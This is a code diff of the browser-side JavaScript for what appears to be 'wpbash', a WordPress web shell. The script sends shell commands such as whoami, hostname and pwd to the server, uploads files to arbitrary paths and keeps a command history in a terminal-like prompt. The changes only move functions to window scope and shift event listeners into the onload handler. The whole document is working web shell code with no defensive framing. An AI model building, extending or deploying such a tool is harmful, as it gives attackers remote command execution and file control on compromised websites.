@@ -18,6 +18,7 @@
     var fileBrowserElement = document.getElementById("wpbash_filebrowser");
 
     window.onload = (event) => {
+
         formElement = document.getElementById("wpbash_form");
         inputTextElement = document.getElementById('wpbash_inputtext');
         inputElement = document.getElementById("wpbash_input");
@@ -25,17 +26,18 @@
         usernameElement = document.getElementById("wpbash_username");
         uploadFormElement = document.getElementById("wpbash_upload");
         fileBrowserElement = document.getElementById("wpbash_filebrowser");
+    
+        formElement.addEventListener("submit", function(event){
+            event.preventDefault()
+        });
+
         getShellInfo();
+
+        document.onkeydown = checkForArrowKeys;
+
     }
     
-    document.onkeydown = checkForArrowKeys;
-    
-    formElement.addEventListener("submit", function(event){
-        event.preventDefault()
-    });
-    
-    
-    function getShellInfo() {
+    window.getShellInfo = function() {
         var request = new XMLHttpRequest();
         
         request.onreadystatechange = function() {
@@ -55,7 +57,7 @@
         request.send("cmd=whoami&hostname&pwd&action=wpbash");
     }
                 
-    function sendCommand() {
+    window.sendCommand = function() {
         var request = new XMLHttpRequest();
         var command = inputTextElement.value;
         var originalCommand = command;
@@ -110,7 +112,7 @@
         return false;
     }
     
-    function uploadFile() {
+    window.uploadFile = function() {
         var formData = new FormData();
         formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
         formData.append('path', currentDir);
@@ -128,11 +130,11 @@
         outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
     }
     
-    function updateInputWidth() {
+    window.updateInputWidth = function() {
         inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
     }
 
-    function checkForArrowKeys(e) {
+    window.checkForArrowKeys = function(e) {
         e = e || window.event;
 
         if (e.keyCode == '38') {
@@ -142,19 +144,19 @@
         }
     }
     
-    function previousCommand() {
+    window.previousCommand = function() {
         if (currentCommand != 0) {
             switchCommand(currentCommand-1);
         }
     }
     
-    function nextCommand() {
+    window.nextCommand = function() {
         if (currentCommand != commandHistory.length) {
             switchCommand(currentCommand+1);
         }
     }
     
-    function switchCommand(newCommand) {
+    window.switchCommand = function(newCommand) {
         currentCommand = newCommand;
 
         if (currentCommand == commandHistory.length) {
